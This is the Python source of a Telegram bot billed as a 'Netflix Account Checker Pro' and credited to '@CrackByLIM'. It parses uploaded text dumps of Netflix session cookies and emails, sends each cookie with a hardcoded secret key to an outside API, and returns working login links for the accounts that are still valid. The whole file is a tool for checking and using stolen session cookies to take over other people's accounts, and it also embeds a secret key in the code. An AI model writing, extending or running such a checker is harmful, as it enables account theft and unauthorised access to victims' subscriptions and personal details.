import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# ==================== YOUR API CONFIGURATION ====================
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://genznfapi.onrender.com"  # YOUR API
SECRET_KEY = "KUROSAKI1D_cP642DCEw0bxnMLHSIFlGZQjVh1RgSPM"  # YOUR SECRET KEY

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ==================== FIX FOR CONFLICT ERROR ====================
def clear_telegram_webhook():
    """Clear any existing webhook/sessions to prevent conflict"""
    try:
        webhook_url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        response = requests.post(webhook_url)
        print(f"✅ Webhook cleared: {response.json()}")
        
        get_updates_url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        requests.post(get_updates_url, json={"offset": -1, "timeout": 0})
        print("✅ Pending updates cleared")
        
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Warning while clearing webhook: {e}")

# Call this before starting the bot
clear_telegram_webhook()
# =============================================================

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== UNIVERSAL .TXT PARSER ====================

def find_account_separator(content):
    """Automatically detect how accounts are separated in the .txt file"""
    separators = [
        '----------------------------------------',
        '════════════════════════════════════════',
        '────────────────────────────────────────',
        '========================================',
        '++++++++++++++++++++++++++++++++++++++++',
        '---------------------------------------',
        '----------',
        '------',
        '\n\n\n',
        '\r\n\r\n',
    ]
    
    for sep in separators:
        if sep in content:
            return sep
    
    lines = content.split('\n')
    account_headers = []
    
    header_patterns = [
        r'ACCOUNT #\d+',
        r'Account #\d+',
        r'PREMIUM ACCOUNT',
        r'Premium Account',
        r'Account \d+',
        r'#\d+',
    ]
    
    for i, line in enumerate(lines):
        for pattern in header_patterns:
            if re.search(pattern, line, re.IGNORECASE):
                account_headers.append(i)
                break
    
    if len(account_headers) > 1:
        return 'HEADER_BASED'
    
    return None

def extract_accounts_from_txt(content):
    """Extract individual accounts from .txt file content"""
    separator = find_account_separator(content)
    accounts = []
    
    if separator and separator != 'HEADER_BASED':
        raw_accounts = content.split(separator)
        accounts = [acc.strip() for acc in raw_accounts if acc.strip()]
        
    elif separator == 'HEADER_BASED':
        lines = content.split('\n')
        current_account = []
        
        for line in lines:
            is_new_account = any([
                re.search(r'ACCOUNT #\d+', line, re.IGNORECASE),
                re.search(r'Account #\d+', line, re.IGNORECASE),
                re.search(r'PREMIUM ACCOUNT', line, re.IGNORECASE),
                re.search(r'Premium Account', line, re.IGNORECASE),
            ])
            
            if is_new_account and current_account:
                accounts.append('\n'.join(current_account))
                current_account = [line]
            elif is_new_account:
                current_account = [line]
            elif current_account:
                current_account.append(line)
            elif 'NetflixId=' in line and not current_account:
                current_account = [line]
        
        if current_account:
            accounts.append('\n'.join(current_account))
    
    else:
        parts = re.split(r'(?=NetflixId=)', content)
        accounts = [part.strip() for part in parts if 'NetflixId=' in part]
    
    accounts = [acc for acc in accounts if acc and len(acc) > 10]
    return accounts

def extract_netflix_id(text):
    """Extract NetflixId from ANY text"""
    patterns = [
        r'NetflixId=([^&\s\'"]+)',
        r'NetflixId[=:]([^&\s\'"]+)',
        r'[Nn]etflix[Ii]d[=:]([^&\s\'"]+)',
        r'Cookie.*?NetflixId=([^&\s]+)',
        r'nftoken=([^&\s]+)',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return match.group(1).strip()
    return None

def extract_email(text):
    """Extract email from ANY text if present"""
    match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
    return match.group(1).strip() if match else None

def extract_field(text, field_names):
    """Extract a field by multiple possible names"""
    for field_name in field_names:
        pattern = rf'{re.escape(field_name)}[:\s=]+([^\n\r]+)'
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1).strip()
    return None

def parse_account_from_txt(account_text):
    """Parse a single account from .txt content"""
    try:
        account = {}
        
        netflix_id = extract_netflix_id(account_text)
        if not netflix_id:
            return None
        
        account['netflix_id'] = netflix_id
        logger.info(f"✅ Found NetflixId: {netflix_id[:30]}...")
        
        email = extract_email(account_text)
        if email:
            account['email'] = email
        else:
            account['email'] = f"user_{netflix_id[:8]}@unknown.com"
        
        name = extract_field(account_text, ['Name', 'Nombre', 'Nome', '名前', '姓名', '이름', 'Имя'])
        if name:
            account['name'] = name
        
        country = extract_field(account_text, ['Country', 'País', 'Pais', '国', '国家', '나라', 'Страна'])
        if country:
            account['country'] = country
        
        plan = extract_field(account_text, ['Plan', 'Plano', 'プラン', '套餐', '요금제', 'План'])
        if plan:
            account['plan'] = plan
        
        quality = extract_field(account_text, ['Video Quality', 'Qualidade', '画質', '视频质量', '화질', 'Качество'])
        if quality:
            account['quality'] = quality
        
        streams = extract_field(account_text, ['Max Streams', 'Máx. de streams', '同時視聴', '最大流', '최대 스트림', 'Макс. потоков'])
        if streams:
            account['max_streams'] = streams
        
        url_match = re.search(r'(https?://[^\s]+nftoken=[^\s]+)', account_text)
        if url_match:
            account['direct_url'] = url_match.group(1).strip()
        
        return account
        
    except Exception as e:
        logger.error(f"Error parsing account: {e}")
        return None

# ==================== YOUR API FUNCTIONS ====================

def format_login_url(url):
    """Ensure URL is properly formatted for Telegram"""
    if not url:
        return None
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    url = url.rstrip('.,;:')
    return url

async def check_netflix_id(netflix_id, email, account_data=None):
    """Check if Netflix ID is valid by calling YOUR API"""
    
    if account_data and account_data.get('direct_url'):
        direct_url = format_login_url(account_data['direct_url'])
        if direct_url:
            logger.info(f"✅ Found direct URL for {email}")
            return {
                "success": True,
                "login_url": direct_url,
                "email": email,
                "data": {"source": "direct_url"}
            }
    
    if not netflix_id:
        return {
            "success": False,
            "error": "No Netflix ID provided",
            "email": email
        }
    
    try:
        # YOUR API endpoint
        url = f"{API_URL}/api/gen"
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"Calling YOUR API for {email}")
        
        response = requests.post(url, json=data, timeout=15)
        
        try:
            result = response.json()
        except:
            return {
                "success": False, 
                "error": "Invalid JSON response from API",
                "email": email
            }
        
        # YOUR API response format
        if result.get('success') == True:
            login_url = format_login_url(result.get('login_url'))
            if login_url:
                logger.info(f"✅ YOUR API returned login URL for {email}")
                return {
                    "success": True,
                    "login_url": login_url,
                    "email": email,
                    "data": result
                }
            else:
                return {
                    "success": False,
                    "error": "API returned success but no login URL",
                    "email": email
                }
        else:
            error_msg = result.get('error', 'Unknown error')
            error_code = result.get('error_code', 'UNKNOWN_ERROR')
            
            if error_code == 'SERVER_ERROR' or '500' in error_msg:
                return {
                    "success": False,
                    "error": "Netflix ID may be expired (Server Error)",
                    "error_code": "SERVER_ERROR",
                    "email": email
                }
            elif 'INVALID_NETFLIX_ID' in error_msg:
                return {
                    "success": False,
                    "error": "Netflix ID is invalid or expired",
                    "error_code": "INVALID_NETFLIX_ID",
                    "email": email
                }
            else:
                return {
                    "success": False,
                    "error": error_msg,
                    "error_code": error_code,
                    "email": email
                }
                
    except requests.exceptions.Timeout:
        return {
            "success": False,
            "error": "API request timed out",
            "email": email
        }
    except requests.exceptions.ConnectionError:
        return {
            "success": False,
            "error": "Cannot connect to API server",
            "email": email
        }
    except Exception as e:
        return {
            "success": False, 
            "error": str(e),
            "email": email
        }

# ==================== TEST YOUR API COMMAND ====================

async def test_your_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test YOUR specific API directly"""
    
    await update.message.reply_text("🔄 Testing YOUR API connection...")
    
    try:
        # Test with a simple request
        response = requests.get(API_URL, timeout=5)
        
        if response.status_code == 200:
            await update.message.reply_text(
                f"✅ **YOUR API IS REACHABLE!**\n\n"
                f"**API URL:** `{API_URL}`\n"
                f"**Status:** Online\n\n"
                f"Use /start to upload files.",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                f"⚠️ **YOUR API RESPONDED WITH STATUS {response.status_code}**",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        await update.message.reply_text(
            f"❌ **CANNOT CONNECT TO YOUR API**\n\n"
            f"Error: `{str(e)}`",
            parse_mode='Markdown'
        )

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user = update.effective_user
    
    welcome = f"""
╔════════════════════════════════════════╗
║     🎬 NETFLIX ACCOUNT CHECKER PRO 🎬  ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👋 **Hello {user.first_name}!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 **Send me a .txt file** with Netflix accounts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **Any .txt format works!** I'll automatically:
✅ Find Netflix cookies anywhere in the text
✅ Extract NetflixId= from any format
✅ Check validity with YOUR API
✅ Send premium login links

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - Instructions
/stats - Statistics
/testapi - Test YOUR API
/clear - Reset session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_text = f"""
╔════════════════════════════════════════╗
║           🆘 HELP CENTER 🆘            ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **HOW TO USE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ **Prepare your .txt file**
   • ANY format is accepted!
   • Just make sure it contains `NetflixId=...`

2️⃣ **Send the .txt file to me**
   • I'll automatically find all Netflix cookies
   • Check each with YOUR API
   • Only valid accounts will be sent

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **EXAMPLES:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ `email:password | NetflixCookies = NetflixId=...`
✓ `馃崻 Cookie: NetflixId=...` (emoji format)
✓ `NetflixId=v%3D3%26ct%3D...` (raw format)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌨️ **COMMANDS:**
/start - Welcome
/stats - Statistics
/testapi - Test YOUR API
/clear - Clear session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    global total_checks, valid_accounts, invalid_accounts
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
╔════════════════════════════════════════╗
║         📊 GLOBAL STATISTICS 📊        ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 **Performance Metrics:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Total Checks:** `{total_checks}`
• **✅ Valid Accounts:** `{valid_accounts}`
• **❌ Invalid Accounts:** `{invalid_accounts}`
• **📊 Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await update.message.reply_text(
        f"""
╔════════════════════════════════════════╗
║         ✅ SESSION CLEARED ✅          ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
You can now upload a new file.

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """,
        parse_mode='Markdown'
    )

# ==================== FILE HANDLER ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files"""
    user_id = update.effective_user.id
    global total_checks, valid_accounts, invalid_accounts
    
    if not check_rate_limit(user_id):
        await update.message.reply_text("⏰ Rate limit exceeded. Please wait a minute.")
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a `.txt` file only.")
        return
    
    status_msg = await update.message.reply_text("📥 Downloading file...")
    
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        accounts = extract_accounts_from_txt(content)
        
        if not accounts:
            await status_msg.edit_text("❌ No Netflix cookies found in file.")
            return
        
        await status_msg.edit_text(f"📊 Found {len(accounts)} potential accounts. Processing...")
        
        valid_count = 0
        invalid_count = 0
        valid_accounts_found = []
        
        for i, account_block in enumerate(accounts, 1):
            account = parse_account_from_txt(account_block)
            
            if not account:
                invalid_count += 1
                continue
            
            if i % 3 == 0 or i == len(accounts):
                await status_msg.edit_text(f"🔄 Processing: {i}/{len(accounts)} (Valid: {valid_count})")
            
            email = account.get('email', f"user_{account['netflix_id'][:8]}@unknown.com")
            result = await check_netflix_id(account['netflix_id'], email, account)
            
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                valid_accounts_found.append({
                    'email': email,
                    'login_url': result['login_url'],
                    'country': account.get('country', 'N/A'),
                    'plan': account.get('plan', 'N/A'),
                    'quality': account.get('quality', 'N/A'),
                    'streams': account.get('max_streams', 'N/A'),
                    'name': account.get('name', 'N/A'),
                })
            else:
                invalid_count += 1
                invalid_accounts += 1
            
            await asyncio.sleep(0.5)
        
        success_rate = valid_count/len(accounts)*100 if len(accounts) > 0 else 0
        
        await status_msg.edit_text(
            f"✅ Complete! Found {valid_count} valid accounts.\n"
            f"Sending them now..."
        )
        
        if valid_accounts_found:
            for idx, acc in enumerate(valid_accounts_found, 1):
                details = []
                if acc.get('name') and acc['name'] != 'N/A':
                    details.append(f"• **Name:** `{acc['name']}`")
                if acc.get('country') and acc['country'] != 'N/A':
                    details.append(f"• **Country:** `{acc['country']}`")
                if acc.get('plan') and acc['plan'] != 'N/A':
                    details.append(f"• **Plan:** `{acc['plan']}`")
                if acc.get('quality') and acc['quality'] != 'N/A':
                    details.append(f"• **Quality:** `{acc['quality']}`")
                
                details_str = '\n'.join(details) if details else ''
                
                msg = f"""
✅ **VALID ACCOUNT #{idx}**

📧 **Email:** `{acc['email']}`
{details_str}

🔗 **Login Link:** `{acc['login_url']}`

⚡ {YOUR_CREDIT}
                """
                
                keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=acc['login_url'])]]
                await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
            
            await update.message.reply_text(f"✅ Sent {valid_count} valid accounts!")
            
        else:
            await update.message.reply_text("❌ No valid accounts found.")
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")

# ==================== BUTTON CALLBACK ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot"""
    print("=" * 60)
    print("🎬 NETFLIX ACCOUNT CHECKER BOT")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ YOUR API: {API_URL}")
    print(f"✅ Secret Key: {SECRET_KEY[:15]}...")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("🤖 Bot is starting...")
    print("=" * 60)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CommandHandler("testapi", test_your_api))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    
    print("✅ Bot is running! Waiting for files...")
    print("=" * 60)
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    main()
